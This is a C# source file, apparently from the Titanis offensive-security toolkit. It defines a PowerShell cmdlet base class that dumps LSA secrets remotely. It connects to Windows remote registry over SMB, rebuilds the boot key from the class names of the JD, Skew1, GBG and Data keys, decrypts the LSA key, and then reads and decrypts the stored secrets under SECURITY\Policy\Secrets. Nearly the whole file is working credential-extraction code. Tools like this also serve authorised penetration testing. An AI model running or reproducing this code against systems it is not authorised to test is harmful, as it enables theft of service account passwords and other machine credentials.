using System;
using System.ComponentModel;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;
using Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public abstract class TboRegLsaSecretCmdlet : TboRegCmdlet
	{
		protected const string LsaKeyPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
		protected const string PolicyPath = @"SECURITY\Policy";
		protected const string SecretsPath = @"SECURITY\Policy\Secrets";
		protected const ulong BootKeyByteSwap = 0xEC6B4D50F91273A8;
		protected static readonly string[] BootKeySubkeys = { "JD", "Skew1", "GBG", "Data" };

		protected byte[] ExtractBootKey(RemoteRegistryClient client, CancellationToken cancellationToken)
		{
			var lsaSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				LsaKeyPath);

			using var lsaKey = OpenRegistryKey(client, lsaSpec, RegistryAccessRights.QueryValue, cancellationToken);

			byte[] bootKey = new byte[16];
			ulong swapKey = BootKeyByteSwap;
			foreach (var subkeyName in BootKeySubkeys)
			{
				var subkeySpec = new RegistryPathSpec(
					lsaSpec.RootKey,
					lsaSpec.RootName,
					CombineSubkeyPath(lsaSpec.SubkeyPath, subkeyName));

				using var subkey = OpenRegistryKey(client, subkeySpec, RegistryAccessRights.QueryValue, cancellationToken);
				var info = subkey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
				var className = info.ClassName?.TrimEnd('\0');
				if (string.IsNullOrWhiteSpace(className))
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} is empty.");

				var bytes = BinaryHelper.ParseHexString(className.AsSpan());
				if (bytes.Length < 4)
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} does not contain 4 bytes.");

				for (int i = 0; i < 4; i++)
				{
					bootKey[(int)(swapKey & 0x0F)] = bytes[i];
					swapKey >>= 4;
				}
			}

			return bootKey;
		}

		protected byte[]? ExtractLsaKey(
			ISmbProviderInfo smb,
			RemoteRegistryClient client,
			byte[] bootKey,
			CancellationToken cancellationToken,
			out string? lsaKeySource)
		{
			lsaKeySource = null;
			var policySpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				PolicyPath);

			byte[]? polEkList = null;
			byte[]? legacy = null;
			try
			{
				using var policyKey = OpenRegistryKey(client, policySpec, RegistryAccessRights.QueryValue, cancellationToken);
				polEkList = TryReadValueBytes(policyKey, "PolEKList", cancellationToken);
				legacy = TryReadValueBytes(policyKey, "PolSecretEncryptionKey", cancellationToken);
			}
			catch (NtstatusException ex) when (ex.StatusCode == Ntstatus.STATUS_PIPE_BUSY)
			{
				polEkList = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, session =>
				{
					using var policyKey = OpenRegistryKey(session.Client, policySpec, RegistryAccessRights.QueryValue, cancellationToken);
					return TryReadValueBytes(policyKey, "PolEKList", cancellationToken);
				});

				legacy = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, session =>
				{
					using var policyKey = OpenRegistryKey(session.Client, policySpec, RegistryAccessRights.QueryValue, cancellationToken);
					return TryReadValueBytes(policyKey, "PolSecretEncryptionKey", cancellationToken);
				});
			}

			if (polEkList != null && polEkList.Length > 0)
			{
				var decrypted = DecryptLsaData(polEkList, bootKey);
				if (decrypted.Length >= 100)
				{
					lsaKeySource = "PolEKList";
					return decrypted.AsSpan(68, 32).ToArray();
				}
			}

			if (legacy != null && legacy.Length >= 76)
			{
				var lsaKey = DecryptLegacyLsaKey(legacy, bootKey);
				if (lsaKey != null)
				{
					lsaKeySource = "PolSecretEncryptionKey";
					return lsaKey;
				}
			}

			return null;
		}

		protected byte[]? TryReadSecretValue(
			RemoteRegistryClient client,
			string secretName,
			string valueName,
			CancellationToken cancellationToken,
			out DateTime? lastWriteTime)
		{
			lastWriteTime = null;
			var secretChildPath = CombineSubkeyPath(secretName, valueName) ?? valueName;
			var secretPath = CombineSubkeyPath(SecretsPath, secretChildPath);
			var secretSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				secretPath);

			try
			{
				using var secretKey = OpenRegistryKey(client, secretSpec, RegistryAccessRights.QueryValue, cancellationToken);
				var info = secretKey.QueryInfo(cancellationToken).GetAwaiter().GetResult();
				lastWriteTime = info.LastWriteTime;

				var valueInfo = secretKey.GetValue(null, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
				return null;
			}
		}

		protected static byte[]? DecryptLsaSecret(byte[] secretBlob, byte[] lsaKey)
		{
			if (secretBlob.Length == 0 || lsaKey.Length == 0)
				return null;

			if (secretBlob.Length >= 60)
				return DecryptLsaData(secretBlob, lsaKey);

			return null;
		}

		protected static bool TryExtractSecretPayload(byte[] decrypted, out byte[] payload)
		{
			payload = Array.Empty<byte>();
			if (decrypted.Length == 0)
				return false;

			if (decrypted.Length >= 8)
			{
				int declared = BitConverter.ToInt32(decrypted, 0);
				if (declared > 0)
				{
					if (TrySlice(decrypted, 8, declared, out payload))
						return true;
					if (TrySlice(decrypted, 12, declared, out payload))
						return true;
					if (TrySlice(decrypted, 16, declared, out payload))
						return true;
				}
			}

			payload = TrimTrailingNulls(decrypted);
			return payload.Length > 0;
		}

		protected static string? TryDecodeSecretString(byte[] payload)
		{
			if (payload.Length == 0)
				return null;

			if (payload.Length % 2 == 0)
			{
				try
				{
					var str = Encoding.Unicode.GetString(payload).TrimEnd('\0');
					if (!string.IsNullOrEmpty(str))
						return str;
				}
				catch
				{
				}
			}

			try
			{
				var str = Encoding.UTF8.GetString(payload).TrimEnd('\0');
				if (!string.IsNullOrEmpty(str))
					return str;
			}
			catch
			{
			}

			return null;
		}

		protected static byte[]? ExtractValueBytes(RegistryValueInfo info)
		{
			if (info.Bytes != null && info.Bytes.Length > 0)
				return info.Bytes;
			if (info.TypedValue is byte[] typedBytes && typedBytes.Length > 0)
				return typedBytes;
			return null;
		}

		protected static byte[]? TryReadValueBytes(RegistryKey key, string name, CancellationToken cancellationToken)
		{
			try
			{
				var valueInfo = key.GetValue(name, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
				return null;
			}
		}

		protected static bool IsMissingKey(Win32Exception ex)
		{
			return ex.NativeErrorCode is (int)Win32ErrorCode.ERROR_FILE_NOT_FOUND
				or (int)Win32ErrorCode.ERROR_PATH_NOT_FOUND
				or (int)Win32ErrorCode.ERROR_BAD_PATHNAME;
		}

		protected static byte[] DecryptLsaData(byte[] policySecret, byte[] key)
		{
			if (policySecret.Length < 60)
				return Array.Empty<byte>();

			byte[] shaKey;
			using (var sha256 = SHA256.Create())
			{
				sha256.TransformBlock(key, 0, key.Length, null, 0);
				for (int i = 0; i < 1000; i++)
				{
					sha256.TransformBlock(policySecret, 28, 32, null, 0);
				}
				sha256.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
				shaKey = sha256.Hash ?? Array.Empty<byte>();
			}

			if (shaKey.Length == 0)
				return Array.Empty<byte>();

			using var aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.None;
			aes.Key = shaKey;
			var iv = new byte[16];

			var output = new byte[(policySecret.Length - 60) / 16 * 16];
			int outputOffset = 0;
			for (int offset = 60; offset + 16 <= policySecret.Length; offset += 16)
			{
				using var decryptor = aes.CreateDecryptor(aes.Key, iv);
				var block = decryptor.TransformFinalBlock(policySecret, offset, 16);
				Buffer.BlockCopy(block, 0, output, outputOffset, block.Length);
				outputOffset += block.Length;
			}

			if (outputOffset != output.Length)
				Array.Resize(ref output, outputOffset);

			return output;
		}

		protected static byte[]? DecryptLegacyLsaKey(byte[] policySecret, byte[] bootKey)
		{
			if (policySecret.Length < 76)
				return null;

			byte[] md5Key;
			using (var md5 = MD5.Create())
			{
				md5.TransformBlock(bootKey, 0, bootKey.Length, null, 0);
				for (int i = 0; i < 1000; i++)
					md5.TransformBlock(policySecret, 60, 16, null, 0);
				md5.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
				md5Key = md5.Hash ?? Array.Empty<byte>();
			}

			if (md5Key.Length == 0)
				return null;

			var encrypted = policySecret.AsSpan(12, 48).ToArray();
			var decrypted = Rc4Transform(md5Key, encrypted);
			if (decrypted.Length < 32)
				return null;

			return decrypted.AsSpan(16, 16).ToArray();
		}

		protected static byte[] Rc4Transform(byte[] key, byte[] data)
		{
			byte[] s = new byte[256];
			for (int i = 0; i < s.Length; i++)
				s[i] = (byte)i;

			int j = 0;
			for (int i = 0; i < s.Length; i++)
			{
				j = (j + s[i] + key[i % key.Length]) & 0xFF;
				(s[i], s[j]) = (s[j], s[i]);
			}

			byte[] output = new byte[data.Length];
			int iIndex = 0;
			j = 0;
			for (int k = 0; k < data.Length; k++)
			{
				iIndex = (iIndex + 1) & 0xFF;
				j = (j + s[iIndex]) & 0xFF;
				(s[iIndex], s[j]) = (s[j], s[iIndex]);
				var keyByte = s[(s[iIndex] + s[j]) & 0xFF];
				output[k] = (byte)(data[k] ^ keyByte);
			}

			return output;
		}

		protected static string? CombineSubkeyPath(string? basePath, string childName)
		{
			if (string.IsNullOrEmpty(basePath))
				return childName;
			if (string.IsNullOrEmpty(childName))
				return basePath;
			return $"{basePath}\\{childName}";
		}

		private static bool TrySlice(byte[] data, int offset, int length, out byte[] payload)
		{
			payload = Array.Empty<byte>();
			if (length <= 0 || offset < 0 || offset > data.Length)
				return false;
			if (offset + length > data.Length)
				return false;
			payload = data.AsSpan(offset, length).ToArray();
			return true;
		}

		private static byte[] TrimTrailingNulls(byte[] data)
		{
			int length = data.Length;
			while (length > 0 && data[length - 1] == 0)
				length--;
			if (length == data.Length)
				return data;
			return data.AsSpan(0, length).ToArray();
		}
	}
}
